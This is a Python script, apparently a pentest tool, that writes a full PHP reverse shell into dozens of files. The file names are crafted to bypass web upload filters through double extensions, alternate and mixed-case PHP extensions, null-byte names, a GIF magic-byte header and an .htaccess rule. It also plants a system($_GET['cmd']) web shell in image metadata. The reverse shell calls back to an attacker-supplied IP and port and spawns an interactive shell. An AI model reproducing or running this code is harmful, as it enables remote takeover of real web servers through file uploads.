#!/usr/bin/python3
#Using php-pentest-monkey-reverse-shell
#http://www.securityidiots.com/Web-Pentest/hacking-website-by-shell-uploading.html#whitelisting-bypass

import sys
import os

if len(sys.argv) != 3:
    print("Usage: python3 exploit.py <IP> <PORT>")
    sys.exit(1)

ip = sys.argv[1]
port = sys.argv[2]

revshell = f'''<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '{ip}';
$port = '{port}';
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {{
	$pid = pcntl_fork();
	
	if ($pid == -1) {{
		printit("ERROR: Can't fork");
		exit(1);
	}}
	
	if ($pid) {{
		exit(0);  // Parent exits
	}}
	if (posix_setsid() == -1) {{
		printit("Error: Can't setsid()");
		exit(1);
	}}

	$daemon = 1;
}} else {{
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {{
	printit("$errstr ($errno)");
	exit(1);
}}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {{
	printit("ERROR: Can't spawn shell");
	exit(1);
}}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {{
	if (feof($sock)) {{
		printit("ERROR: Shell connection terminated");
		break;
	}}

	if (feof($pipes[1])) {{
		printit("ERROR: Shell process terminated");
		break;
	}}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {{
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}}

	if (in_array($pipes[1], $read_a)) {{
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}}

	if (in_array($pipes[2], $read_a)) {{
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}}
}}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {{
	if (!$daemon) {{
		print "$stringn";
	}}
}}

?>
 '''

b1 = f'''GIF89a;
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '{ip}';
$port = '{port}';
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {{
	$pid = pcntl_fork();
	
	if ($pid == -1) {{
		printit("ERROR: Can't fork");
		exit(1);
	}}
	
	if ($pid) {{
		exit(0);  // Parent exits
	}}
	if (posix_setsid() == -1) {{
		printit("Error: Can't setsid()");
		exit(1);
	}}

	$daemon = 1;
}} else {{
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {{
	printit("$errstr ($errno)");
	exit(1);
}}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {{
	printit("ERROR: Can't spawn shell");
	exit(1);
}}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {{
	if (feof($sock)) {{
		printit("ERROR: Shell connection terminated");
		break;
	}}

	if (feof($pipes[1])) {{
		printit("ERROR: Shell process terminated");
		break;
	}}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {{
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}}

	if (in_array($pipes[1], $read_a)) {{
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}}

	if (in_array($pipes[2], $read_a)) {{
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}}
}}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {{
	if (!$daemon) {{
		print "$stringn";
	}}
}}

?>
 '''

#create folder to store revshells
os.system("mkdir shells")


#writing the first file
f1 = open("shells/revbase.php", "w")
f1.write(revshell)
f1.close()

#writing gif magic byte
f2 = open("shells/gifmagic.php", "w")
f2.write(b1)
f2.close()

#writing PHP double extension
f3 = open("shells/rev2ext1.jpg.php", "w")
f3.write(revshell)
f3.close()

#writing PHP double extension
f4 = open("shells/rev2ext2.php.jpg", "w")
f4.write(revshell)
f4.close()

#writing PHP double extension
f5 = open("shells/rev2ext3.php:.jpg", "w")
f5.write(revshell)
f5.close()

#writing PHP double extension
f55 = open("shells/rev2ext4.php;.jpg", "w")
f55.write(revshell)
f55.close()

#writing web-shell in image metadata using exiftool
os.system("curl https://thispersondoesnotexist.com/ -o shells/metadata-shell.jpg")
os.system("exiftool -Comment='<?php echo \"<pre>\"; system($_GET['cmd']); ?>' shells/metadata-shell.jpg")
os.system("mv shells/metadata-shell.jpg shells/metadata-shell.php.jpg")
os.system("rm shells/metadata-shell.jpg_original")

#other executable extensions
f6 = open("shells/revshell.php1", "w")
f6.write(revshell)
f6.close()

#other executable extensions
f7 = open("shells/revshell.php2", "w")
f7.write(revshell) 
f7.close()

#other executable extensions
f8 = open("shells/revshell.php3", "w")
f8.write(revshell) 
f8.close()

#other executable extensions
f9 = open("shells/revshell.php4", "w")
f9.write(revshell) 
f9.close()

#other executable extensions
f10 = open("shells/revshell.php5", "w")
f10.write(revshell) 
f10.close()

#other executable extensions
f11 = open("shells/revshell.phtml", "w")
f11.write(revshell) 
f11.close()

#other extensions case sensitive
f12 = open("shells/revCaseSens.PhP", "w")
f12.write(revshell) 
f12.close()

#other extensions case sensitive
f13 = open("shells/revCaseSens.Php1", "w")
f13.write(revshell) 
f13.close()

#other extensions case sensitive
f14 = open("shells/revCaseSens.PhP2", "w")
f14.write(revshell) 
f14.close()

#other extensions case sensitive
f15 = open("shells/revCaseSens.pHP2", "w")
f15.write(revshell) 
f15.close()

#other extensions case sensitive
f16 = open("shells/revCaseSens.pHp4", "w")
f16.write(revshell) 
f16.close()

#other extensions case sensitive
f17 = open("shells/revCaseSens.PHp5", "w")
f17.write(revshell) 
f17.close()

#other extensions case sensitive
f18 = open("shells/revCaseSens.PhtMl", "w")
f18.write(revshell) 
f18.close()

#upload .htaccess and then upload shell.shell
os.system('echo "AddType application/x-httpd-php .shell" > "shells/.htaccess"')
f19 = open("shells/shell.shell", "w")
f19.write(revshell) 
f19.close()

#null byte injection
f20 = open("shells/shell.php%00.jpg", "w")
f20.write(revshell) 
f20.close()

#null byte injection
f21 = open("shells/shell.php#.jpg", "w")
f21.write(revshell) 
f21.close()
